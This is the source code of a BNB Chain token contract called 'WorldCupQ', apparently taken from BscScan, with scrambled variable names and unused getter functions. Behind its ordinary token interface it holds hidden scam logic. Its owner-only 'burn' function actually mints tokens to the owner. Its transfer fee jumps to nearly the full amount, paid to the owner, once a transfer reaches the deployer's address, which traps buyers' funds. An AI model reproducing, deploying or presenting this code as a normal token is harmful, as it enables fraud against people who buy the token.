/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16 12:16
 */
 /*

 ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ 
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
 ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 

*/

 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract IKTQFSP {
uint256 private  ODSTTU = 1000000000000000;
uint256 private  ZEWRYN = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address private  UOBGDB = address(0);
uint8 public constant decimals = 18;
address private  BPEMJH = address(0);
uint256 private  FEDSIQ = 10000000000000;
address private  CGRUBZ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  IQBQPW = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "WorldCupQ";
address private  YZRYYL = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
uint256 private  GBHALX = 100000000;
string public  symbol = "WorldCupQ";
uint256 private  VMPOLI = 1000000000000000000000;
uint256 private  MQQYLT = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant KAGFQH = 99999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  AFKNDO = 10000000000;
function _getGBHALX() private returns (uint256) {
return GBHALX;
}

function _getYZRYYL() private returns (address) {
return YZRYYL;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getAFKNDO() private returns (uint256) {
return AFKNDO;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LWTXQM");
require(to != address(0), "LWTXQM");
require(amount <= balanceOf[from], "LWTXQM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KAGFQH/ZEWRYN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==BPEMJH){
ZEWRYN = KAGFQH+2;
}
emit Transfer(from, to, transferAmount);
}
function _getIQBQPW() private returns (address) {
return IQBQPW;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getMQQYLT() private returns (uint256) {
return MQQYLT;
}

function _getODSTTU() private returns (uint256) {
return ODSTTU;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tLWTXQM 0");
require(spender != address(0), "fLWTXQM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getFEDSIQ() private returns (uint256) {
return FEDSIQ;
}

function _getUOBGDB() private returns (address) {
return UOBGDB;
}

function _getCGRUBZ() private returns (address) {
return CGRUBZ;
}

constructor () public {
BPEMJH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getVMPOLI() private returns (uint256) {
return VMPOLI;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}